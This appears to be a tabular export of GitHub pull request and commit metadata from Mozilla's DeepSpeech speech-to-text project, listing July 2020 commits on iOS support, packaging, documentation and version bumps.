698,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b18a3a4ef52ba9e56afc590a82cdb2b980d8aa5d,"Merge pull request #3147 from tilmankamp/data_set_tool

Resolves #3146 - Let build_sdb.py also output CSV files and rename it accordingly"
699,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fb43c3eb22175db0c5a9f9337efefc906cea84,Add UWP Nuget packing support
700,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9bdce0a30584fa1a3c66260d251a042243976541,Move deepspeech_ios_test projects to same level as deepspeech_ios
701,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a24d7ab5b128e29675b4cfb0b11aa6df5f41b986,"Merge pull request #3100 from carlfm01/uwp

Add UWP Nuget packing support"
702,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce0ef4fd1ed7da9fe45169cfc83698de8b3e1d7c,Build and publish deepspeech_ios.framework
703,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2fd1474e6992a873aa72856ca606913dbe765581,Fix deepspeech_ios_project reference after folder move
704,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47685f059f8d81fc0e44ecfd8409b5683b109813,Disable code signing in CI builds
705,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3185,3185,Doc generate scorer,,lissyx,1645737,2020-07-27T08:27:47Z,COLLABORATOR,True,19,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8629573587e5e1296473cf61eded560f6bf4f6a9,"Fix #3182: document rebuild of generate_scorer_package

X-DeepSpeech: NOBUILD"
706,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3185,3185,Doc generate scorer,,lissyx,1645737,2020-07-27T08:27:47Z,COLLABORATOR,True,19,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e3c4209b9b6665b137306af6d0061fa9774d420,"Fix #3184: add missing label for data augmentation doc

X-DeepSpeech: NOBUILD"
707,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3179,3179,Fixes #3178 - Librosa requires 1-dimensional array for mono samples,,tilmankamp,5991088,2020-07-23T15:20:01Z,CONTRIBUTOR,True,7,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecbdf46940d2497307d1c616b37f63a1e14d81ef,Fixes #3178 - Librosa requires 1-dimensional array for mono samples
708,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3177,3177,Resolves #1565 - Limiting and reversing data-sets,,tilmankamp,5991088,2020-07-23T15:00:50Z,CONTRIBUTOR,True,61,21,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a5d19d7c50bccb963c0a05aa1b7199fe173ae22,Resolves #1565 - Limiting and reversing data-sets
709,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3176,3176,Document Alphabet methods in decoder binding as well,,reuben,477142,2020-07-23T11:00:55Z,MEMBER,True,32,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb33fc171932c0779a4f7e06bec5a2a961546bf7,Document Alphabet methods in Python binding as well
710,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3176,3176,Document Alphabet methods in decoder binding as well,,reuben,477142,2020-07-23T11:00:55Z,MEMBER,True,32,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2cdc228db48fe62330381214863d0a8e4e405d2f,Use Alphabet.CanEncode in text_to_char_array
711,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9bf4d73641d48481e3745b359c49707d79783f4,Generate augmented data sets
712,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abd693f4c5e0c679b8e22f3afe3f0fb4d53aa4cd,Installing libsndfile1
713,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b53110e21c59481a380e46326eb118543e6c665,Installing ffmpeg
714,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e401b9aa1414a68d953744537beea9c6c80d29a,Moving old set to a backup dir
715,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c411c2921ac6f64298a584a31f5103a8adbee8c,Changing cwd to target data-set dir (for tmp file handling)
716,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76cf78581dc36f8ea693f310ce8e53a9c4be119d,Re-entrant and beter logging
717,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec16362a056100fa36e2286c44e256d5ce1a61dd,No SW installation
718,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dce31680b081852e80b8962ef5bc9c1f9c31f858,"Changing into target dir, redirceting stderr"
719,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdf1a1fb018510c9ae34c272fdb08b25f7f4321d,Limiting augmentation and noise samples
720,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3174,3174,Augment,I have a voice note to be converted into text. Please can you help?,rs180497,68623244,2020-07-22T01:13:57Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d225e129f325a667210124919e39568e63f8e369,Separated hdf5 generation from sample augmentation
721,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9bdce0a30584fa1a3c66260d251a042243976541,Move deepspeech_ios_test projects to same level as deepspeech_ios
722,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce0ef4fd1ed7da9fe45169cfc83698de8b3e1d7c,Build and publish deepspeech_ios.framework
723,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2fd1474e6992a873aa72856ca606913dbe765581,Fix deepspeech_ios_project reference after folder move
724,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47685f059f8d81fc0e44ecfd8409b5683b109813,Disable code signing in CI builds
725,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,509d06d474c9c1f55ea7335bbf0223b38bf52996,Fix typo in ios-package.sh
726,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3173,3173,Build and publish iOS framework in GitHub release files,,reuben,477142,2020-07-21T17:59:11Z,MEMBER,True,61,6,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,844b375e7d6af74223017392c697f917526e1e40,Address review comments
727,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3168,3168,Bump caches and fix linker issues in new workers,,reuben,477142,2020-07-19T19:16:02Z,MEMBER,False,24,44,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,601005260106926c488f006597a8798cdb913c6e,Bump caches and fix linter issues in new workers
728,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f2964e6abce72c2a35a588b86c6af79ebe587bd,Bump VERSION to 0.9.0-alpha.1
729,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6dc7ba8c0fb52456586450bba6463934a908369,Add methods to check for label presence in Alphabet
730,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c64e416f6110730ee676144e1124c19fb7bf43bf,"Merge pull request #3131 from mozilla/alphabet-fallible

Add methods to check for label presence in Alphabet"
731,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18ea7391f3dde4393f313c9590f4332a81c15b26,Bump VERSION to 0.9.0-alpha.2
732,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,417b8e4fe3238fbc33570c8b0600ca23c88aedca,Fix style inconsistencies in Java bindings
733,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16f89dff9e5a999475d5096569a263fcc40d65da,Update Java docs
734,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2471b10c27d06765fa8446a872c594cb159e144c,Update Java tests
735,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,084da3724d0dc87eb8f74d87a6ab515e16d01e04,Fix: #3130 - Missing deepspeech_training.util.text.Alphabet
736,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d412b86b0d0a68d20c74a97ca65bbeb581f14538,"Merge pull request #3135 from mozilla/java-inconsistencies

Fix some style inconsistencies in Java bindings (Fixes #3121)"
737,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6882248ab05314c9150812757e4e51bf27998c38,"Merge pull request #3137 from tilmankamp/fix_missing_alphabet

Fix: #3130 - Missing deepspeech_training.util.text.Alphabet"
738,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,daf28086e58ffaa4e99b0b9343bb353ada3da036,Add note on model input data considerations and reference training/scorer docs
739,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,672ce377ac6ee675c7deb4d0ef33194cf5102032,Only update examples submodule from remote
740,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48f904ac2739691f52faa1f8efc5b849cb8ec97e,Fix #3127: Adjust PATH for electronjs/windows with electron-builder
741,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe7fdb95f6c281cea84a7c44a9ad37c361809e06,"Merge pull request #3139 from lissyx/electron-builder-win

Fix #3127: Adjust PATH for electronjs/windows with electron-builder"
742,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fd4a0451f5259762f9c23b74042ff944d403f12,Address review comments
743,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48cd53e4740e009ce8c6b707e83548e71cb4376c,Merge branch 'reference-training-decoder-docs' (Fixes #3140)
744,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b832acb54b5e5ab56c6c192a8e6c0a625f36fc85,Fix #3141: Add ElectronJS v9.1
745,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f953d12ba07d91cf592e017896f7bd7ea7161a1,Fix nasty regression on some build/cache tasks
746,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,825923a652852a8721773a8fdbcea6217f35b92c,"Merge pull request #3142 from lissyx/electronjs-v9.1

Fix #3141: Add ElectronJS v9.1"
747,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61bd5dd88dd262a1fedc46a2e47668bef9eefa8b,Resolves #3144 - Add augmentation support to build_sdb.py
748,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84f4c15278fe5c6fad02b945cee01bcd712ddf5e,"Merge pull request #3145 from tilmankamp/build_sdb_aug

Resolves #3144 - Add augmentation support to build_sdb.py"
749,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,37dc3e08a417f8eb6acc070cf68f308b8bdb4445,Fix several typos in docs.
750,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb7a0457a3b0507433cfc9dd56d070f35c01170e,"Merge pull request #3151 from pbxqdown/master

Fix several typos in docs."
751,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f27c802d986f08e5eded60ec0221c0600d237f8,Use ElementTree instead of deprecated cElementTree.
752,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75804924f2fc502e647403f1abad71417682d531,"Merge pull request #3159 from tirkarthi/fix-xml

Use ElementTree instead of deprecated cElementTree."
753,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c31c4843b3396943b332d6742ea974d34a7d9876,Fix #3157: Add CircleCI config
754,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fd8049bfde7a234b5b88bcaf261469fcf241ac7,"Merge pull request #3160 from lissyx/circleci

Fix #3157: Add CircleCI config"
755,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,554cfae02005cc43cae7ce0a68abadf4f076dbcb,Bump VERSION to 0.9.0-alpha.3
756,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,78ae08cdb462297fbf3db2e5c8cb339bc3d9ae4c,"Merge pull request #3161 from lissyx/bump-v0.9.0-alpha.3

Bump VERSION to 0.9.0-alpha.3"
757,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3162,3162,Update r0.8,,lissyx,1645737,2020-07-15T14:32:26Z,COLLABORATOR,True,428,285,67,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,820350f719d5003f59fd4f9f716f996bcb46a4a0,Merge remote-tracking branch 'upstream/master' into update-r0.8
758,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3161,3161,Bump VERSION to 0.9.0-alpha.3,,lissyx,1645737,2020-07-15T14:22:38Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,554cfae02005cc43cae7ce0a68abadf4f076dbcb,Bump VERSION to 0.9.0-alpha.3
759,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3160,3160,Fix #3157: Add CircleCI config,,lissyx,1645737,2020-07-15T14:18:32Z,COLLABORATOR,True,95,34,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c31c4843b3396943b332d6742ea974d34a7d9876,Fix #3157: Add CircleCI config
760,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3159,3159,Use ElementTree instead of deprecated cElementTree.,Fixes #3158 ,tirkarthi,3972343,2020-07-15T12:46:45Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f27c802d986f08e5eded60ec0221c0600d237f8,Use ElementTree instead of deprecated cElementTree.
761,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3151,3151,Fix several typos in docs.,,pbxqdown,6386150,2020-07-11T23:49:40Z,NONE,True,5,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,37dc3e08a417f8eb6acc070cf68f308b8bdb4445,Fix several typos in docs.
762,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ce07afae045ce9bf014a36719a0dfec75662187,Add TensorFlow iOS tasks
763,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c85f95f781ee8c007502bcfc4ab2e24fc3e3e24c,Add DeepSpeech iOS tasks
764,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ca0f94d78658d4b57c784197046c669122c7b7d,client.cc iOS build
765,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a1aa873259a96d12969039fdc958d9a2d9243ec3,Embed bitcode when linking
766,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a274c26a89c7fb4334473b8f715325c8e1e5c30d,Add Swift wrapper framework
767,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7c50663e1094631b1b6931aba5cb19cd695ac71,Checkout fixed formulas commit in tf_tc-brew.sh
768,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8d642bf44c9285f33efc0cba05e28d45e0cbad4,Bump TensorFlow to remove usage of -z linker keyword on iOS
769,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c38d569685a8209295ccc021607e408b60c0d05,Use submodule TF tc-vars.sh
